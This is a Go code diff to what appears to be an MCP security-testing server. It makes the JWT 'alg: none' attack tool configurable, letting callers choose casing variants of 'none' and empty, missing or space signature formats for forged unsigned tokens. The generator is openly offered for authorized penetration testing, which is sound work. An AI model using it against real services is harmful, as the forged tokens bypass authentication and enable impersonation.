@@ -97,7 +97,9 @@ type JwtForgeArgs struct {
 }
 
 type JwtNoneAttackArgs struct {
-	Token string `json:"token" jsonschema:"required" jsonschema_description:"Original JWT token to attack"`
+	Token   string   `json:"token" jsonschema:"required" jsonschema_description:"Original JWT token to attack"`
+	Cases   []string `json:"cases,omitempty" jsonschema_description:"Case variants to try. Default: all 7 (none, None, NONE, nOnE, noNe, nONE, NonE). Pass [\"none\"] for the smallest payload (1 alg variant)."`
+	Formats []string `json:"formats,omitempty" jsonschema_description:"Signature formats to emit. Default: all 3 (empty_sig, no_dot, space_sig). Most servers only need empty_sig."`
 }
 
 type JwtKeyConfusionArgs struct {
@@ -294,39 +296,44 @@ func (backend *Backend) jwtNoneAttackHandler(ctx context.Context, request mcp.Ca
 		return mcp.NewToolResultError(fmt.Sprintf("failed to parse payload JSON: %v", err)), nil
 	}
 
-	noneVariants := []string{"none", "None", "NONE", "nOnE", "noNe", "nONE", "NonE"}
-	tokens := make([]map[string]any, 0, len(noneVariants)*3)
+	noneVariants := args.Cases
+	if len(noneVariants) == 0 {
+		noneVariants = []string{"none", "None", "NONE", "nOnE", "noNe", "nONE", "NonE"}
+	}
+	formats := args.Formats
+	if len(formats) == 0 {
+		formats = []string{"empty_sig", "no_dot", "space_sig"}
+	}
+	formatSig := map[string]string{
+		"empty_sig": ".",
+		"no_dot":    "",
+		"space_sig": ". ",
+	}
 
+	tokens := make([]map[string]any, 0, len(noneVariants)*len(formats))
 	for _, variant := range noneVariants {
 		header := map[string]string{"alg": variant, "typ": "JWT"}
 		headerJSON, _ := json.Marshal(header)
 		headerEncoded := b64UrlEncode(headerJSON)
 
-		// Format 1: empty signature with trailing dot (standard)
-		tokens = append(tokens, map[string]any{
-			"alg":    variant,
-			"format": "empty_sig",
-			"token":  headerEncoded + "." + payloadB64 + ".",
-		})
-
-		// Format 2: no trailing dot at all
-		tokens = append(tokens, map[string]any{
-			"alg":    variant,
-			"format": "no_dot",
-			"token":  headerEncoded + "." + payloadB64,
-		})
-
-		// Format 3: space as signature
-		tokens = append(tokens, map[string]any{
-			"alg":    variant,
-			"format": "space_sig",
-			"token":  headerEncoded + "." + payloadB64 + ". ",
-		})
+		for _, fmtName := range formats {
+			suffix, ok := formatSig[fmtName]
+			if !ok {
+				continue
+			}
+			tokens = append(tokens, map[string]any{
+				"alg":    variant,
+				"format": fmtName,
+				"token":  headerEncoded + "." + payloadB64 + suffix,
+			})
+		}
 	}
 
 	return mcpJSONResult(map[string]any{
 		"tokens":          tokens,
 		"originalPayload": originalPayload,
+		"casesUsed":       noneVariants,
+		"formatsUsed":     formats,
 	})
 }
 
